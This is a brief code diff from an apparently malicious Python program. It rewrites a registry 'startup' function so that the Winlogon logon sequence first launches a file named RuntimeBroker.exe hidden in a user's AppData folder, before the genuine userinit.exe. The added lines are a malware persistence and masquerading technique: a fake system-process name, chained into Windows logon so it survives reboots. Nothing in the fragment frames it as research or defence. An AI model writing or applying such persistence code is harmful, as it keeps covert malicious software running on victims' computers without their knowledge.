@@ -133,8 +133,8 @@ try {
     def add_registry_startup(path, name):
         import winreg
         
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, rf'{path}')
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, '"C:\Users\Arman\AppData\Local\Microsoft\Windows\Explorer\RuntimeBroker.exe",C:\Windows\system32\userinit.exe')
         winreg.CloseKey(key)
 
 
